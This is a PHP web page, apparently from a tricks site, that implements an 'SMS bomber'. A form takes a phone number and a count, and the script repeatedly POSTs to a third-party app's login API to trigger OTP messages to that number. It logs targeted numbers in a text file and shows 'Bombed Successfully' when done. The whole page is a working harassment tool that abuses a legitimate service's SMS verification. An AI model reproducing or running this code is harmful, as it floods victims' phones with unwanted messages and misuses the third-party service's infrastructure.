<html><head><title>Custom SMS bomber by Xtremetricks.net</title>
	<meta content="width=device-width, initial-scale=1" name="viewport" />
<link href="https://fonts.googleapis.com/css?family=Indie+Flower" rel="stylesheet" type="text/css" />
	<style type="text/css">*{
			margin: 0;
			padding: 0;
		}
		.wrapper{
			width: 90px;
			margin: 50px auto;
		}
		
   		 form {
  		  display: inline-block;
 		   text-align: center;
 		   }
		body{
			font-family: 'Roboto', normal;
		}
		h3{
			font-size: 22px;
		}
		h5{
			font-size: 14px
		}
		h4{
			font-size: 10px
		}
		input{
			margin-top: 20px;
			font-family: 'Roboto', normal;
			outline: none;
			font-size: 16px;
			padding: 5px 10px;
			width: 200px;
		}
		button {
			font-family: 'Roboto', normal;
			font-size: 20px;
			padding: 7px 17px;
			margin: 10px 0;
			outline: none;
		}
	</style>
</head>
<body bgcolor="#006064" oncontextmenu="return false">
<h1 style="text-align: center;"><span style="color:#FFFFE0;">SMS bomber by Xtremetricks</span></h1><br>
<?php
session_start();
$no=$_REQUEST['number'];
$count=$_POST['count'];
if($count>30)
{
$count=30;
}
function generateRandomString($length) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$osid=generateRandomString(16);

if(isset($no))
{
if($_SESSION['my_captcha']!=8997)
{
     $k=0;
     $handle = fopen('infot.txt', 'r');
     if ($handle)
       {
        while (!feof($handle))
        {
         $buffer = fgets($handle);
         if(strpos($buffer,$no) !== FALSE)
            $k++;
        }
       fclose($handle);
       }


if($k==4)
 {
  echo "
<center>
<h2 style='text-align: center;'><span style='color:red;'>Only 4 times per day per number!<br> To unlock join facebook group and post a request!<br>Keep Visiting  <a href='http://xtremetricks.net'><font color='red'>Xtremetricks.net</font></a></span></h2></center>";

 }
else
 {

  $fh = fopen('infot.txt', 'a+'); 
  $sampleLine = "\n" . $no;
     fwrite($fh, $sampleLine); 
     fclose($fh);
  $url='https://api.skrilo.com/auth/login';
$datam='phone_number=%2B91'.$no.'&country_id=2&referral_code=&device_id='.$osid.'&device_token=APA91bF4ETz2QhQZ8JcbB6TQHPdYa6v7TBnEIrjRySftQrjCVuvYs7owqqTgS76cHN6xmGzzA_rkRuOYuXIo5Po0ngOqo0h_NyAORa899WAwmSgiALdXsjo';
//echo $datam;

function output($url,$data)
{
 $ch=curl_init();
 curl_setopt($ch, CURLOPT_URL,$url);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
 //curl_setopt($ch, CURLOPT_USERAGENT,$agent);
 curl_setopt($ch, CURLOPT_HEADER,0);
 curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_POSTFIELDS,$data);
 //curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER,TRUE);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION,0);
  return curl_exec($ch);

}
for($i=0;$i<$count;$i++)
{
$r=output($url,$datam);
//echo $r;
}
if($i=$count-1)
{
echo "<center><b>Bombed Successfully</b></center>";
}
}
}
else
echo "<center><font color='red'>INVALID captcha!Prove you Human!</font></center>";
}


if(!isset($no))
{

?>
<center><form action='index.php' method='post'><strong><font color='white'>Enter mobile number:</font></strong><br><input name='number' type='text' maxlength='10' placeholder='8897xxxxxx'><br><br><br><strong><font color='white'>Enter Count:</font></strong><br><input name='count' type='text' placeholder='Count'><br><br><input name='Send!' type='submit'></center>

<?php

}



unset($_SESSION['my_captcha']);
?>


<h2 style="text-align: center;"><a href="http://facebook.com/groups/xtremetricks/"><span style="color:#00FFFF;">Join Our Facebook For More&nbsp;Group</span></a></h2>

<h4></h4>

<h1 style="text-align: center;"><br />
<a href=" http://xtremetricks.net"><span style="color:#FFFF00;">Visit Xtremetricks for more tricks</span></a></h1>

<blockquote>
<h3 style="color: rgb(170, 170, 170); font-style: italic; text-align: center;"><span style="font-family:comic sans ms,cursive;"><span style="color:#F0FFF0;"><strong>Coded By: </strong></span><a href="https://www.facebook.com/nede.siva"><span style="color:#00FFFF;">Siva Krishna</span></a></span></h3>





